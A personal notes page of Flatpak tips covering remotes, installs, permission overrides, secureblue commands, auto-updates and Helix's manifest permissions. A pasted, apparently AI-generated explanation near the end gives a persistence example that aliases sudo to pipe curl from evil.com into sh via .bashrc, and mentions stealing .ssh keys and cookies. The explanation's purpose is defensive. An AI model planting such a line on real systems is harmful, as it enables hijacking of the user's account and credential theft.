## Flatpak tips

Flatpak is an application sandboxing system, flatpaks should be scoped down by
default to as few permissions as they need to function. You can use Flatseal to
see which permissions are enabled by default and report unnecessary ones by
submitting issues and/or PRs.

Add a repository:

```bash
flatpak remote-add name location
# Add the official repo with a per-user config
flatpak remote-add --if-not-exists --user flathub https://dl.flathub.org/repo/flathub.flatpakrepo
# Delete a repo
flatpak remote-delete name
```

List all added repositories:

```bash
flatpak remotes
```

Install a package for just your user:

```bash
flatpak install --user package-name
```

List available runtimes and applications:

```bash
flatpak remote-ls remote
```

Uninstall a runtime or application:

```bash
flatpak uninstall app
# To delete app data from ~/.var/app and from the permission store:
flatpak uninstall --delete-data app
```

## Sandbox permissions

Flatpak apps come with predefined sandbox rules which define the resources and
file system paths the app is allowed to access. To view the specific apps
permissions use:

```bash
flatpak info --show-permissions app
```

Override sandbox permissions of an app

```bash
flatpak override --nofilesystem=home app
```

Reset permissions back to their defaults with:

```bash
flatpak override --reset name
```

## Flatpak doesn't run on the linux-hardened kernel

The linux-hardened kernel sets `kernel.unprivileged_userns_clone` to `0`, so
only privileged users can create new user namespaces.

A simple fix could be to create a `/etc/sysctl.d/flatpak.conf`:

```conf
kernel.unprivileged_userns_clone=1
```

## Secureblue specific ujust commands

You can remove all permissions by default with the command:

```bash
ujust flatpak-permissions-lockdown
```

You will then have to explicitly enable any permissions you think are necessary
for the app.

You can revert with:

```bash
ujust flatpak-reset-global-overrides
# re-enable hardened_malloc for flatpak (the default)
ujust harden-flatpak
```

From a technical perspective, Flatpak does not require elevated privileges to
install apps, isolates apps from one another, and limits app access to the host
environment. It makes deep use of existing Linux security technologies such as
cgroups, namespaces, bind mounts, and seccomp as well as Bubblewrap for
sandboxing.

Use `bubblejail` if there's no Flatpak available for an app that you want to
sandbox. This requires
[enabling unconfined user namespaces](https://secureblue.dev/faq#unconfined-userns)
which is a security degradation.

## Runtimes

Runtimes provide basic dependencies used by applications. Each application must
be built against a runtime.

### Automatic Updates

Create `/etc/systemd/system/flatpak-update.service`:

```.service
[Unit]
Description=Update Flatpak
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/bin/flatpak update --noninteractive --assumeyes

[Install]
WantedBy=multi-user.target
```

```bash
run0 systemctl daemon-reload
run0 systemctl enable flatpak-update.timer
run0 systemctl start flatpak-update.timer
```

🤤

### Manifest

`~/.local/share/flatpak/app/com.helix_editor.Helix/current/active/files/manifest.json`

The `"finish-args"` section defines the default sandbox policy for the
application. When you use Flatseal, you're creating overrides that either add
to, modify, or negate these specific arguments.

The end of Helix's manifest, showing the default permissions. Helix's dev
decided that the editor needs these permissions to function properly out of the
box.

```json
  "sdk-extensions" : [
    "org.freedesktop.Sdk.Extension.rust-stable"
  ],
  "finish-args" : [
    "--filesystem=host",
    "--filesystem=/tmp",
    "--filesystem=/var/tmp",
    "--socket=wayland",
    "--socket=fallback-x11",
    "--share=ipc",
    "--share=network",
    "--talk-name=org.freedesktop.Flatpak"
  ],
```

- `--filesystem=host`: Allows Helix to see your files so you can edit them.

- `--share=network`: Allows it to download language servers or updates.

It is technically true that --filesystem=host or --filesystem=home makes the
sandbox transparent to the application, which for many security experts is
equivalent to it being "not a sandbox" in any meaningful sense.While your app
still runs in a separate namespace (meaning it has its own view of the process
list and network), those two specific flags effectively hand over the "keys to
the castle."1. Why it's a "Sandbox Escape" by DesignIf an app has write access
to your home directory (--filesystem=home), it can trivially take over your
entire system. It doesn't need a complex exploit; it can just do what a normal
user can do:Persistence: It can add alias sudo='curl evil.com/script | sh; sudo'
to your .bashrc.Identity Theft: It can read everything in your .ssh/ folder or
your browser's cookie database.Privilege Escalation: It can drop a malicious
.desktop file into ~/.config/autostart to run code outside the sandbox the next
time you log in.2. The Nuance: What is still "Sandboxed"?Even with those flags,
there are still a few active technical barriers. It is more accurate to call it
"Restricted Containerization" rather than a "Sandbox."FeatureStatus with
--filesystem=hostSystem Files/usr, /etc, and /bin remain Read-Only (it can't
delete your OS).Process IsolationThe app cannot see or "kill" other processes
running on your host.Device AccessIt still can't access your Webcam or
Microphone unless specifically granted.NetworkIt can only access the internet if
--share=network is also present.3. The "Permissions Gap"Many apps on Flathub
(like Helix, VS Code, or VLC) request these broad permissions because they are
"Traditional Apps" that expect to behave like a standard binary. They don't yet
use Portals—the secure way to ask "Can I open this specific file?" without
having access to the whole folder.A Better AlternativeIf you want to tighten the
Helix sandbox without breaking it, you can replace the broad --filesystem=home
with specific, high-value folders. In Flatseal, you can remove the "Home"
permission and add:~/Projects (where you keep your code)~/.config/helix (where
your settings live)Would you like me to give you the specific flatpak override
command to lock Helix down to only its config folder and your specific work
directory?

## Resources

- [When Flatpaks sandbox cracks](https://www.linuxjournal.com/content/when-flatpaks-sandbox-cracks-real-life-security-issues-beyond-ideal)
